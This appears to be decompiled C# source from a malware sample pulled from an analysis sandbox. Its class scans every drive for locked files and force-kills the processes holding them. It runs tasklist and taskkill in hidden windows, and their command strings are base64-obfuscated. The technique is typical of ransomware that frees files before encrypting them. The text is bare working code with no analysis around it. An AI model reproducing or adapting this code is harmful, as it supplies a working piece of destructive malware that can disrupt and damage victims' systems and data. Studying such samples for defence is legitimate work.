// Decompiled with JetBrains decompiler
// Type: Complex.LockedFiles
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace Complex
{
  internal class LockedFiles
  {
    public static readonly List<string> GeneralFilesList = new List<string>();
    public static readonly List<string> OpenFilesList = new List<string>();

    public static void ReleaseLockedFiles()
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.IsReady)
            LockedFiles.RecursiveReleaseFiles(drive.Name);
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void RecursiveReleaseFiles(string path)
    {
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        foreach (FileInfo file in directoryInfo.GetFiles())
        {
          try
          {
            LockedFiles.GeneralFilesList.Add(file.FullName);
          }
          catch (UnauthorizedAccessException ex)
          {
          }
        }
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        {
          try
          {
            LockedFiles.RecursiveReleaseFiles(directory.FullName);
          }
          catch (UnauthorizedAccessException ex)
          {
          }
        }
      }
      catch
      {
      }
      if (LockedFiles.GeneralFilesList.Count <= 0)
        return;
      foreach (string str in LockedFiles.GeneralFilesList.Where<string>((Func<string, bool>) (text => LockedFiles.Islocked(text))))
        LockedFiles.OpenFilesList.Add(str);
      LockedFiles.GeneralFilesList.Clear();
      if (LockedFiles.OpenFilesList.Count <= 0)
        return;
      foreach (FileSystemInfo fileSystemInfo in LockedFiles.OpenFilesList.Select<string, FileInfo>((Func<string, FileInfo>) (text2 => new FileInfo(text2))))
        LockedFiles.Killproc(fileSystemInfo.Name);
    }

    public static bool Islocked(string fileName)
    {
      FileStream fileStream = (FileStream) null;
      try
      {
        fileStream = File.Open(fileName, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      }
      catch (UnauthorizedAccessException ex1)
      {
        try
        {
          fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.None);
        }
        catch (Exception ex2)
        {
          return true;
        }
      }
      catch (Exception ex)
      {
        return true;
      }
      finally
      {
        fileStream.Close();
      }
      return false;
    }

    public static void Killproc(string filename)
    {
      try
      {
        foreach (string str in ((IEnumerable<string>) LockedFiles.proc_exe(Program.Base64Decode("dGFza2xpc3Q="), Program.Base64Decode("L3YgL2ZvIGNzdg==")).Split(new string[1]
        {
          "\r\n"
        }, StringSplitOptions.None)).Where<string>((Func<string, bool>) (t => t.Contains(filename))).Select<string, string[]>((Func<string, string[]>) (t => t.Split(','))).Select<string[], string>((Func<string[], string>) (array2 => array2[1].Replace("\"", ""))).ToList<string>())
          LockedFiles.proc_exe(Program.Base64Decode("dGFza2tpbGw="), Program.Base64Decode("L2YgL3BpZCA=") + str);
      }
      catch (Exception ex)
      {
      }
    }

    public static string proc_exe(string file, string arg)
    {
      string str;
      try
      {
        Process process = Process.Start(new ProcessStartInfo(file, arg)
        {
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = false,
          CreateNoWindow = true
        });
        string end1;
        using (StreamReader standardOutput = process.StandardOutput)
          end1 = standardOutput.ReadToEnd();
        string end2;
        using (StreamReader standardError = process.StandardError)
          end2 = standardError.ReadToEnd();
        process.WaitForExit();
        str = end2 + end1;
      }
      catch (Exception ex)
      {
        str = ex.Message + "\n<------------>\n" + ex.StackTrace;
      }
      return str;
    }
  }
}
